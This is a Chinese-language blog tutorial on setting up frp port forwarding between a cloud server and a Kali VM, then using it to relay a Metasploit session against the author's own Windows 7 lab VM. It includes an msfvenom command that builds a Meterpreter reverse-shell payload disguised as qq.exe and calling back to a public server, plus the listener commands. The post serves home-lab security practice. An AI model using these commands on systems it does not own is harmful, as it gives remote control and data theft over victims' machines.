---
title: "使用 frp 搭建 Metasploit 公网实验环境"
date: 2022-4-18 20:18:36
tags: ["frp", "Metasploit", "内网穿透"]
categories:
  - ["网络安全", "安全实验"]
cover: https://res.cloudinary.com/sycamore/image/upload/v1792216255/Covers/87d91c5d20cc130aa72fe99c74a9e8c2.png
updated: 2026-10-20 12:36:09
---

本文记录在云服务器和 Kali 虚拟机之间配置 frp 的过程，先测试 SSH 连接，再记录 Metasploit 实验中的转发配置。
<!-- more -->

:::info
本文使用 frp 0.41.0、Ubuntu 18.04.6 云服务器和 Kali Linux 2022 虚拟机，配置文件为 INI 格式。以下操作记录基于这套环境，使用其他版本时需要对照对应版本的文档。
:::

## 准备

实验需要一台有公网 IP 的服务器运行 frps，以及一台能够访问互联网的机器运行 frpc。本文的分工如下：

- **frps 服务端**：Ubuntu 18.04.6 云服务器。
- **frpc 客户端**：Kali Linux 2022 虚拟机。
- **项目地址**：[fatedier/frp](https://github.com/fatedier/frp)。

## frps（云服务器）

### 下载安装

在项目的 [0.41.0 发布页面](https://github.com/fatedier/frp/releases/tag/v0.41.0)找到 Linux amd64 安装包。截图对应的是本文使用的版本。

![frp 0.41.0 发布页面中的 Linux amd64 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792085325/Typora/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png)

1. 在云服务器终端中下载：

```bash
wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz
```

![在 Ubuntu 云服务器中下载 frp](https://res.cloudinary.com/sycamore/image/upload/v1792085323/Typora/2023/04/d8b546285137f60d42fef4a27a06d821.png)

2. 解压下载的文件：

```bash
tar -zxvf frp_0.41.0_linux_amd64.tar.gz
```

![解压 frp 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792085323/Typora/2023/04/4063a698f14734b0fb54a92974122ba5.png)

3. 输入 `cd frp_0.41.0_linux_amd64/`，进入解压后的目录。

这个目录同时包含 frps 和 frpc。截图中删除了 frpc 相关文件，只保留服务端文件；这不是安装的必要步骤，保留它们也不会影响运行。

![解压目录中保留的 frps 文件](https://res.cloudinary.com/sycamore/image/upload/v1792085317/Typora/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png)

### 编写 frps 配置文件

服务端需要设置与客户端通信的端口。本文还启用了监控页面，方便查看运行情况；如果不需要，可以省略 `dashboard_` 开头的三项配置。

输入 `vim frps.ini`，填写以下内容：

```ini
[common]
bind_port = 7777
dashboard_port = 9999
dashboard_user = Sycamore
dashboard_pwd = 123456
```

`bind_port` 是 frps 与 frpc 通信的端口，`dashboard_port` 是监控页面的端口。下面两项是监控页面的登录账号和密码。

![frps.ini 中的通信端口与监控页面配置](https://res.cloudinary.com/sycamore/image/upload/v1792085315/Typora/2023/04/02f8cca9459920e2f031c95fec4c172e.png)

截图里的 `123456` 只是实验使用的弱密码，不适合直接用于公网服务。启用监控页面时，应更换密码并限制访问来源；不使用时就关闭对应配置。

本文配置涉及的端口为 7777、9999，云服务器的访问规则也需要与配置对应。

### 运行

在 `frp_0.41.0_linux_amd64` 目录下输入 `./frps -c frps.ini`，以前台方式运行服务。

> **前台运行时，关闭终端或停止命令可能会使进程退出。**

需要在退出终端后继续运行，可以使用原记录中的后台命令：

```bash
nohup ./frps -c frps.ini >/dev/null 2>&1 &
```

这个命令将输出丢弃，也不负责机器重启后的自动启动。本文的服务端使用后台运行方式，客户端则通过 systemd 管理。

## frpc（Kali 虚拟机）

服务端准备好后，接下来配置 Kali 中的客户端。下面的安装、配置和运行操作都在 Kali 虚拟机中完成。

![实验使用的 Kali Linux 虚拟机](https://res.cloudinary.com/sycamore/image/upload/v1792085315/Typora/2023/04/692976286e5ddec8cd744326a1c3a54d.png)

### 下载安装

下载、解压和进入目录的步骤与服务端相同，使用相同版本的安装包。客户端使用 `frpc` 和 `frpc.ini`，无需删除目录中的 frps 文件。

### 编写 frpc 配置文件

客户端需要知道 frps 的地址，并声明要转发的服务。本文先转发 Kali 的 SSH 服务，用来检查连接是否正常；`[ssh]` 是这项转发配置的名称，并不是 frp 必须依赖 SSH 才能工作。

输入 `vim frpc.ini`，填写以下内容：

```ini
[common]
server_addr = 106.15.52.194
server_port = 7777

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6666
use_compression = true
```

这里的 IP 是实验中的服务器地址。`server_port` 对应服务端的 `bind_port`；`[ssh]` 中的配置则把 Kali 的本地 SSH 服务映射到云服务器的 6666 端口。

![frpc.ini 的 SSH 转发配置及注释](https://res.cloudinary.com/sycamore/image/upload/v1792085307/Typora/2023/04/2144e375ff1aca162bb41868d050259f.png)

这张图中还包含后文的 `[msf]` 配置，本节只看 `[common]` 和 `[ssh]` 两部分。

### 运行

在程序目录中输入 `./frpc -c frpc.ini`，可以以前台方式运行客户端。如果需要开机启动，可以使用 systemd 管理。

本文将程序和配置放在 `/root/frp/`。服务文件中的路径必须与实际位置一致，不能直接把解压目录和这个路径混用。

在 `/lib/systemd/system/frp.service` 中填写本实验使用的服务配置：

```ini
[Unit]
Description=Frp Client Service
After=network.target remote-fs.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
ExecStart=/root/frp/frpc -c /root/frp/frpc.ini
Restart=always
RestartSec=20s

[Install]
WantedBy=multi-user.target
```

![frpc 的 systemd 服务文件及注释](https://res.cloudinary.com/sycamore/image/upload/v1792470140/Typora/2026/10/20/frp-systemd-annotation.png)

本实验使用了下面几条服务管理命令，服务名 `frp` 对应文件名 `frp.service`：

- 启动服务：`systemctl start frp`。
- 启用开机启动：`systemctl enable frp`。
- 重启服务：`systemctl restart frp`。
- 停止服务：`systemctl stop frp`。
- 查看服务状态及近期日志摘要：`systemctl status frp`。

## SSH 连接测试

服务运行后，通过云服务器的映射端口测试 SSH。输入 `ssh root@x.x.x.x -p 6666`，其中 `x.x.x.x` 是云服务器的公网地址。

虽然连接入口是云服务器，经过转发后实际登录的是 Kali，因此使用的是 Kali 的 SSH 账号。下面的连接结果也显示了 Kali 的系统信息。

![通过映射端口连接到 Kali 的 SSH 测试结果](https://res.cloudinary.com/sycamore/image/upload/v1792085306/Typora/2023/04/52501488b9125c9518e2190783a8fcf4.png)

也可以在 Xshell 中创建会话，填写云服务器地址和映射端口：

![Xshell 的连接地址和映射端口设置](https://res.cloudinary.com/sycamore/image/upload/v1792470145/Typora/2026/10/20/frp-xshell-port-annotation.png)

接着填写 Kali 的登录用户名和密码：

![Xshell 的 Kali 登录账号设置](https://res.cloudinary.com/sycamore/image/upload/v1792470151/Typora/2026/10/20/frp-xshell-login-annotation.png)

保存并连接后，可以看到 Kali 的终端：

![Xshell 成功连接 Kali](https://res.cloudinary.com/sycamore/image/upload/v1792085303/Typora/2023/04/7eed7e40069de144ddcfb74725077325.png)

## msf 渗透攻击测试

SSH 连接完成后，下面继续记录 Metasploit 实验中的端口配置和截图。相关操作在 Kali 中进行，测试目标是 Win 7 x64 虚拟机。

### frpc 添加新配置

编辑 `frpc.ini`，在文件末尾添加本实验中的配置：

```ini
[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333
```

![frpc.ini 中新增的 msf 转发配置](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png)

### msf 生成木马

本节使用云服务器的转发入口，因此原记录中的 LHOST、LPORT 填写的是云服务器地址和映射端口。生成命令如下：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe > qq.exe
```

![生成测试文件 qq.exe 的终端截图](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/f72e4363a982738b25b5976722ab8948.png)

### msf 监听反弹的 shell

本实验先让 frps、frpc 保持运行，再将测试文件传到 Win 7 x64 虚拟机。下图记录的是通过 Kali 的 Apache2 页面下载文件：

![Win 7 虚拟机通过内网页面下载测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png)

监听端使用的命令如下：

1. `msfconsole`：打开 Metasploit。
2. `use exploit/multi/handler`：选择监听模块。
3. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`：设置 payload。
4. `set LHOST 127.0.0.1`：设置监听地址。
5. `set LPORT 4444`：设置本地监听端口。
6. `run`：开始监听。

> **先启动监听，再运行测试文件。**

下面是 Win 7 中运行测试文件的截图：

![在 Win 7 虚拟机中运行测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792085296/Typora/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png)

监听端截图中出现了 Meterpreter 会话，并列出了桌面文件：

![监听端建立 Meterpreter 会话的截图](https://res.cloudinary.com/sycamore/image/upload/v1792085295/Typora/2023/04/204ea56873200eb9b2507252955adb2a.png)
